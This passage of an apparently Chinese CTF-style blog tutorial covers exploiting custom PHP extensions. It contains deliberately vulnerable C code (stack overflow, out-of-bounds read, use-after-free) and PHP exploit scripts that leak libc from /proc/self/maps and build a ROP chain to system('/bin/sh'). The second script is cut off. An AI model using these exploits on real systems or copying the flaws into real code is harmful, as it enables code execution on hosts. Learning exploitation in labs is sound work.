say: %s&quot;</span>, str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>然后加点 info 信息，这部分的内容修改可以通过调用 phpinfo() 看到。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_MINFO_FUNCTION(apple)</span><br><span class="line">&#123;</span><br><span class="line">    php_info_print_table_start();</span><br><span class="line">    php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;apple support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">    php_info_print_table_row(<span class="number">2</span>,<span class="string">&quot;author&quot;</span>, <span class="string">&quot;key&quot;</span>);    <span class="comment">// 添加的内容</span></span><br><span class="line">    php_info_print_table_end();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>修改之后重新编译安装一遍就好，记得重启下 docker<br>在 docker 内</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
+<p>然后在宿主机</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart php81</span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="验证内容"><a href="#验证内容" class="headerlink" title="验证内容"></a>验证内容</h4><h5 id="验证-phpinfo"><a href="#验证-phpinfo" class="headerlink" title="验证 phpinfo"></a>验证 phpinfo</h5><p>在 .&#x2F;Src 文件夹下创建文件 index.php ，写如下内容</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>.&#x2F;Src 目录挂载了 php81 容器的 &#x2F;var&#x2F;www&#x2F;html 目录，可以直接通过访问容器映射的端口来查看效果<br>在浏览器访问 <strong><a class="link"   target="_blank" rel="noopener" href="http://ip:1724/index.php" >http://ip:1724/index.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong> ，就能看到 phpinfo() 的执行效果，查看到 apple 部分有 author 字段及内容。ip 请根据实际做对应调整。</p>
+<h5 id="验证-Recall-函数"><a href="#验证-Recall-函数" class="headerlink" title="验证 Recall 函数"></a>验证 Recall 函数</h5><p>在 .&#x2F;Src 文件夹下创建文件 test.php ，写如下内容</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">  <span class="title function_ invoke__">Recall</span>(<span class="string">&quot;Do you like apple?\n&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>来到容器中，cd &#x2F;var&#x2F;www&#x2F;html ，直接运行 test.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php test.php</span><br></pre></td></tr></table></figure></div>
+<p>看到回显为：<code>You say: Do you like apple?</code> ，就是验证成功。</p>
+<h3 id="漏洞简单研究"><a href="#漏洞简单研究" class="headerlink" title="漏洞简单研究"></a>漏洞简单研究</h3><p>实际比赛就是先得到有漏洞的 .so 文件（有时可能题目附件直接提供），然后分析。<br>由于是本地探究，就自己直接写源码，下面不给出完整生成安装过程，生成安装和前面的步骤是一致的。</p>
+<h4 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h4><p>libc 地址获取是比较简单的，直接读取 <code>/proc/self/maps</code> 就好</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="variable">$searchTerm</span> = <span class="string">&quot;libc.so.6&quot;</span>;</span><br><span class="line"><span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">    <span class="variable">$lineNumber</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$line</span>, <span class="variable">$searchTerm</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$lineNumber</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sscanf</span>(<span class="variable">$line</span>, <span class="string">&quot;%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Libc Address: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>) . PHP_EOL;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>定义两个拓展函数</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetThing</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$offset</span></span>): <span class="title">int</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteThing</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$str</span></span>): <span class="title">void</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>具体实现，<br>configure 生成的 Makefile 需要删去 <em>-O2</em> 优化，否则会加上 FORTIFY 保护，导致 <code>memcpy</code> 函数加上长度检查变为 <code>__memcpy_chk</code> 函数：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(GetThing)</span><br><span class="line">&#123;</span><br><span class="line">	zend_long offset;</span><br><span class="line">	zend_long result;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_LONG(offset)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *target = (<span class="type">void</span> *)&amp;offset;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (target != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;result, target+offset, <span class="keyword">sizeof</span>(result));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RETURN_LONG(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(WriteThing)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="type">char</span>* input_str;</span><br><span class="line">	<span class="type">size_t</span> input_len;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_STRING(input_str, input_len)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(buf, input_str, input_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>任意注意到，是越界读写的漏洞，正常打 ROP 就好</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="variable">$searchTerm</span> = <span class="string">&quot;libc.so.6&quot;</span>;</span><br><span class="line"><span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">    <span class="variable">$lineNumber</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$line</span>, <span class="variable">$searchTerm</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$lineNumber</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sscanf</span>(<span class="variable">$line</span>, <span class="string">&quot;%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Libc Address: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>) . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rdi</span> = <span class="variable">$addr</span> + <span class="number">0x2a145</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pop rdi: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$rdi</span>) . PHP_EOL;</span><br><span class="line"><span class="variable">$binsh</span> = <span class="variable">$addr</span> + <span class="number">0x1A7EA4</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;binsh: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$binsh</span>) . PHP_EOL;</span><br><span class="line"><span class="variable">$system</span> = <span class="variable">$addr</span> + <span class="number">0x53110</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;system: 0x&quot;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$system</span>) . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,、</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="variable">$rdi</span>+<span class="number">1</span>,</span><br><span class="line">    <span class="variable">$rdi</span>,</span><br><span class="line">    <span class="variable">$binsh</span>,</span><br><span class="line">    <span class="variable">$system</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$bin</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;Q*&quot;</span>, ...<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">WriteThing</span>(<span class="variable">$bin</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h4><p>php 内存管理，就是 zend 引擎的内存管理：emalloc 和 efree 。而不是用和 glibc 的那一套 malloc，calloc，free 什么的。不同于 glibc 的各种大小的 chunk，zend 引擎的内存管理只有有三种情况：</p>
+<table>
+<thead>
+<tr>
+<th>size</th>
+<th>name</th>
+<th>机制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>size &gt; 2mb - 4kb</td>
+<td>huge</td>
+<td>直接调用操作系统的 malloc（或类似接口）进行分配</td>
+</tr>
+<tr>
+<td>3kb &lt; size &lt;&#x3D; 2mb - 4kb</td>
+<td>large</td>
+<td>按页分配</td>
+</tr>
+<tr>
+<td>size &lt;&#x3D; 3kb(3072)</td>
+<td>small</td>
+<td>小内存会被分配到特定的 Slot（槽位）中。ZMM 预设了 30 多个不同大小的 Bin（例如 8, 16, 24, … 3072 字节）。</td>
+</tr>
+</tbody></table>
+<p>一般的攻击都基于 small 类型的内存，在本文就只讨论 small 类型的内存，在机制上其实和 tcache 是类型的，都是后进先出的单链表结构。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptr1 = emalloc(<span class="number">0x60</span>);</span><br><span class="line">ptr2 = emalloc(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">efree(ptr2);</span><br><span class="line">efree(ptr1);</span><br><span class="line"></span><br><span class="line">ptr3 = emalloc(<span class="number">0x60</span>);</span><br><span class="line">ptr4 = emalloc(<span class="number">0x60</span>);</span><br></pre></td></tr></table></figure></div>
+<p>最后 ptr3 和 ptr1 的值的一样的，ptr4 和 ptr2 的值是一样的。而 efree 后会产生 <strong>ptr1 -&gt; ptr2</strong> 这样的链表结构，只要改写 ptr1 的内容就能劫持链表。</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>定义增删改查的函数</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetNote</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$idx</span>, <span class="keyword">int</span> <span class="variable">$size</span></span>): <span class="title">void</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ThrowNote</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$idx</span></span>): <span class="title">void</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ViewNote</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$idx</span></span>): <span class="title">string</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditNote</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$idx</span>, <span class="keyword">string</span> <span class="variable">$content</span></span>): <span class="title">void</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>然后实现</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">void</span>* content;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> <span class="title">notes</span>[0<span class="title">x10</span>] =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(GetNote)</span><br><span class="line">&#123;</span><br><span class="line">    zend_long idx;</span><br><span class="line">    zend_long size;</span><br><span class="line">    </span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">       	Z_PARAM_LONG(idx)</span><br><span class="line">       	Z_PARAM_LONG(size)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">0x10</span>) &#123;</span><br><span class="line">       	php_printf(<span class="string">&quot;Idx should be between 1 and 15&quot;</span>);</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    notes[idx].size = size;</span><br><span class="line">    notes[idx].content = emalloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(ThrowNote)</span><br><span class="line">&#123;</span><br><span class="line">    zend_long idx;</span><br><span class="line">    </span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">       	Z_PARAM_LONG(idx)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">0x10</span>) &#123;</span><br><span class="line">       	php_printf(<span class="string">&quot;Idx should be between 1 and 15&quot;</span>);</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(notes[idx].content == <span class="literal">NULL</span>) &#123;</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    efree(notes[idx].content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(ViewNote)</span><br><span class="line">&#123;</span><br><span class="line">    zend_long idx;</span><br><span class="line">    </span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">       	Z_PARAM_LONG(idx)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">0x10</span>) &#123;</span><br><span class="line">       	php_printf(<span class="string">&quot;Idx should be between 1 and 15&quot;</span>);</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(notes[idx].content == <span class="literal">NULL</span>) &#123;</span><br><span class="line">       	RETURN_EMPTY_STRING();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    RETURN_STRINGL(notes[idx].content, notes[idx].size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(EditNote)</span><br><span class="line">&#123;</span><br><span class="line">    zend_long idx;</span><br><span class="line">    <span class="type">char</span> *new_content;</span><br><span class="line">    <span class="type">size_t</span> new_content_len;</span><br><span class="line">    </span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        Z_PARAM_LONG(idx)</span><br><span class="line">        Z_PARAM_STRING(new_content, new_content_len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= <span class="number">0x10</span>) &#123;</span><br><span class="line">       	php_printf(<span class="string">&quot;Idx should be between 1 and 15&quot;</span>);</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(notes[idx].content == <span class="literal">NULL</span>) &#123;</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (new_content_len &gt;= notes[idx].size) &#123;</span><br><span class="line">       	RETURN_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(notes[idx].content, new_content, new_content_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>是相对明显的 UAF，编译后由于 got 可写，就通过劫持 got 来劫持执行流</p>
+<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="variable">$searchTerm1</span> = <span class="string">&quot;libc.so.6&quot;</span>;</span><br><span class="line"><span class="variable">$searchTerm2</span> = <span class="string">&quot;apple.so&quot;</span>;</span><br><span class="line"><span class="variable">$found1</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$found2</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$line1</span> = -<span class="number">1</span>;</span><br><span class="line"><span class="variable">$line2</span> = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$found1</span> &amp;&amp;<span class="title function_ invoke__">strpos</span>(<span class="variable">$line</span>, <span class="variable">$searchTerm1</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$found1</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$line1</span> = <span class="variable">$line</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$found2</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$line</span>, <span class="variable">$searchTerm2</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$found2</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$line2</span> = 